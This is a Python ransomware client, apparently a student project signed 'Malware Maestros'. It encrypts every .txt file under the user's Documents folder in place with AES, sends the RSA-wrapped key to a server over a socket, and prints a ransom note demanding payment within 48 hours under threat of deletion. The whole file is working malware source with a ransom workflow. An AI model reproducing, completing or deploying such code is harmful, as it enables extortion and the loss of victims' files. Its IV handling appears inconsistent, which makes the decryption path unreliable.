BLOCK_SIZE = 16

def generate_key():

    import random
    import string

    aes_key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    return aes_key

def aes(aes_key,iv, file_path):

    from Crypto.Cipher import AES
    import os

    # Generate a 256-bit (32-byte) secret key
    key = aes_key.encode("utf8")
    
    # Write the IV to a file
    with open("IV.txt", "wb") as f:
        f.write(iv)

    # Open the input file for reading
    with open(file_path, 'rb') as f:
        plaintext = f.read()

    # Pad the plaintext to a multiple of the block size
    plaintext += b"\0" * (BLOCK_SIZE - len(plaintext) % BLOCK_SIZE)

    # Create an AES cipher object with the key and IV
    cipher = AES.new(key, AES.MODE_CBC, iv)

    # Encrypt the plaintext using the cipher object
    ciphertext = cipher.encrypt(plaintext)

    # Write the encrypted data to a new file
    with open(file_path, 'wb') as f:
        f.write(ciphertext)

    # print("Encryption of text file complete.")


# ------------------- Find .txt -------------------
def find_txt(aes_key, iv):
    import glob
    import os

    iv = os.urandom(BLOCK_SIZE)

    directory = os.path.join(os.path.expanduser('~'), 'Documents')
    for root, dirs, files in os.walk(directory):
               for file in files:
                if file.endswith(".txt"):
                    # print(os.path.join(root, file))
                    aes(aes_key, iv, os.path.join(root, file))
                    
    print("ALL FILES ENCRYPTED")        

def find_txt_decode(unencrypted_aes_key):
    import glob
    import os

    iv = os.urandom(BLOCK_SIZE)

    directory = os.path.join(os.path.expanduser('~'), 'Documents')
    for root, dirs, files in os.walk(directory):
               for file in files:
                if file.endswith(".txt"):
                    # print(os.path.join(root, file))
                    aes_decode(os.path.join(root, file), unencrypted_aes_key)
                    
    print("ALL FILES DECRYPTED")    
# -------------------------------------------------------------
def rsa_Encode( aes_key, keyPair_public):

    # encrypt aes_key with public key
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_OAEP


    keyPair_public_RSA = RSA.import_key(keyPair_public)

    cipher = PKCS1_OAEP.new(keyPair_public_RSA)
    ciphertext = cipher.encrypt(aes_key.encode("utf8"))

    with open('encryptedKey.key', 'wb') as f:
        f.write(ciphertext)

    return ciphertext
    
# ----------------------------------------------------------------------

def aes_decode(file_path, unencrypted_aes_key):
    
    from Crypto.Cipher import AES
    import os

    aes_key = unencrypted_aes_key

    # save key as a text file with .key extension
    with open('Key.key', 'wb') as f:
        f.write(aes_key)
    f.close()

    # Decrypt the ciphertext using the same key and IV
    # Open the IV file for reading
    with open("IV.txt", 'rb') as f:
        iv = f.read()

    # print("iv in decoding", iv)

    cipher = AES.new(aes_key, AES.MODE_CBC, iv)

    with open(file_path, 'rb') as f:
        ciphertext = f.read()

    
    plaintext = cipher.decrypt(ciphertext)
    # Strip the padding from the plaintext
    plaintext = plaintext.rstrip(b"\0")

    
    # print(plaintext)

    # Write the decrypted data to a new file
    with open(file_path, 'wb') as f:
        f.write(plaintext)


import socket

SERVER_IP = '127.0.0.1'
SERVER_PORT = 5678

with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
    s.connect((SERVER_IP, SERVER_PORT))
    print("Connection accepted from Server")

    # client generates random key
    # print("generating random key..")
    random_key = generate_key()

    # input("Press any key to encrypt!")

    # encrypt all files in the specified directory using  AES
    # print("encrypting the files using the random key..")
    iv = b'x'
    find_txt(random_key, iv)

    # client receives public key(RSA) from server 
    # print("receiving the public key from the server..")
    public_key = s.recv(1024)

    # random key is encrypted using the public RSA key 
    # print("encrypting the random key..")
    encrypted_random_key= rsa_Encode(random_key, public_key)

                        # ---------------------------------#
    s.send(encrypted_random_key)
    print('''
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠚⠉⠀⠀⠉⠑⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⠀⠀⠀⠀⠀⠀⠀⠀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⣠⠔⠋⠉⣩⣍⠉⠙⠢⣄⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢧⡜⢏⠓⠒⠚⠁⠈⠑⠒⠚⣹⢳⡸⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⠸⡄⠀⠀⠀⠀⠀⠀⢠⠇⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⡴⠚⠉⢣⡙⢦⡀⠀⠀⢀⡰⢋⡜⠉⠓⠦⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡴⠁⢀⣀⣀⣀⣙⣦⣉⣉⣋⣉⣴⣋⣀⣀⣀⡀⠈⢧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡸⠁⠀⢸⠀⠀⠀⠀⢀⣔⡛⠛⡲⡀⠀⠀⠀⠀⡇⠀⠈⢇⠀⠀⠀⠀
⠀⠀⠀⢠⠇⠀⠀⠸⡀⠀⠀⠀⠸⣼⠽⠯⢧⠇⠀⠀⠀⠀⡇⠀⠀⠘⡆⠀⠀⠀
⠀⠀⠀⣸⠀⠀⠀⠀⡇⠀⠀⠀⠳⢼⡦⢴⡯⠞⠀⠀⠀⢰⠀⠀⠀⠀⢧⠀⠀⠀
⠀⠀⠀⢻⠀⠀⠀⠀⡇⠀⠀⠀⢀⡤⠚⠛⢦⣀⠀⠀⠀⢸⠀⠀⠀⠀⡼⠀⠀⠀
⠀⠀⠀⠈⠳⠤⠤⣖⣓⣒⣒⣒⣓⣒⣒⣒⣒⣚⣒⣒⣒⣚⣲⠤⠤⠖⠁⠀⠀⠀
⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
''')
    
    print("Greetings, dear user. Your files have been encrypted with our state-of-the-art encryption algorithm. Your data is now safely under our control. If you want your files back, you must pay the ransom within 48 hours, or all your files will be permanently deleted. Don't try to decrypt your files by yourself, as any attempt to do so will result in total data loss. We'll be waiting for your payment. Stay tuned for further instructions - Malware Maestros ")
    input("PRESS ENTER to decrypt \n --- and make sure you pay :) 3ashan e7na hackers tayebeen (only for the project) --- ")
    
   # sends the encrypted AES key back to the server
    # print("sending the encrypted random key to the sever.. ")

    # print("receiving the unecrypted key from the server..")
    unencrypted_aes_key = s.recv(1024)

    
    # print("decrypting the files using the unencrypted key..")
    find_txt_decode(unencrypted_aes_key )

    input("YOUR FILES ARE NOW DECRYPTED. Press any key to exit!")


